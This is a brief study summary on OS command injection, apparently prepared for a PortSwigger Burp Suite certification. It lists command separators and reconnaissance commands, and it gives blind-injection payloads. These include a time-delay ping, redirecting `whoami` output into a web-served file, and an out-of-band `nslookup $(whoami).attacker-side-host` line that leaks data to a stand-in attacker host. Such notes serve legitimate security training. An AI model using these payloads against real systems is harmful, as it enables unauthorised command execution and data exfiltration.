##### PortSwigger BurpSuite Certification Summary
# OS Command Injection
Execute arbitrary command line functions by altering input that is used as an argument.

#### Command Line Cheat Sheet

<table>
<tr><th>Command Separation </th><th>Useful Commands</th></tr>
<tr><td>

| **Universal**   |
|------------|
| &  |
| \| |
| >  |
| >> |
| &&  |
| \|\|  |

</td><td>

|**Description** | **Unix**   | **Windows**   |
|-|------------|---------------|
| current user | whoami     | whoami        |
| OS version | uname -a   | ver           |
| network interfaces | ifconfig   | ipconfig /all |
| active connections| netstat -an | netstat -an   |
| running processes | ps -ef     | tasklist      |
| command separation like ENTER | ; | |
| inline command | \`cmd\` | |
| inline command | $(cmd) | |


</td></tr> </table>

#### Blind OSCI
Often the output cannot be seen, so a time delay can used: `& ping -c 10 127.0.0.1 &`. However, this works only for sequential handling of commands.

Output can also be written to files and then accessed from the browser:
  * At the vulnerable place do `||whoami>/var/www/images/output.txt||`
  * Change the image fetching request to get the `output.txt` file instead of an image

In case statements are handled asynchronously, an out-of-band attack can be useful to check for a CI vulnerability:
  * `nslookup attacker-side-host`
  * `nslookup $(whoami).attacker-side-host`
